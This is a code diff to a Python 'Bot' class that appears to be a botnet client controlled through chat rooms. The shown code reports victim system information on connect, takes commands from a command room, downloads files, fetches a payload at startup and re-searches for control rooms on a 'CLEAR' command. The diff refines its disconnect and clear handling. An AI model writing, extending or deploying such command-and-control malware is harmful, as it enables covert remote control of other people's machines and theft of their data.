@@ -75,11 +75,10 @@ class Bot:
                 f"CONNECT:{self.get_system_info()}"
             )
         
-    def disconnect(self):
-        with self.room_lock:
-            self.announce_room.send_text(
-                f"DISCONNECT:{self.command_room.room_id}:{self.bot_id}"
-            )
+    def stop(self):
+        self.announce_room.send_text(
+            f"DISCONNECT:{self.command_room.room_id}:{self.bot_id}"
+        )
     
     def download_file(self, event, download_dir="downloads") -> str:
         content = event["content"]
@@ -153,10 +152,13 @@ class Bot:
                 self.last_ping = time.time()
                 
         elif command.startswith("CLEAR"):
-            command, targets = command.split(":")
-            if targets == "ALL" or targets == self.bot_id:
+            command, targets = command.split(":", 1)
+            print("RECEIVED CLEAR")
+            if targets == "ALL":
                 with self.room_lock:
                     self.command_room.leave()
+                self.start_room_search()
+            elif targets == self.bot_id:
                 self.start_room_search()
                 
         else:
@@ -222,7 +224,7 @@ class Bot:
         self.download_payload()
         
         def exit_handler():
-            self.disconnect()
+            self.stop()
         atexit.register(exit_handler)
         
         threading.Thread(name="PING THREAD", target=self.check_pings, daemon=True).start()
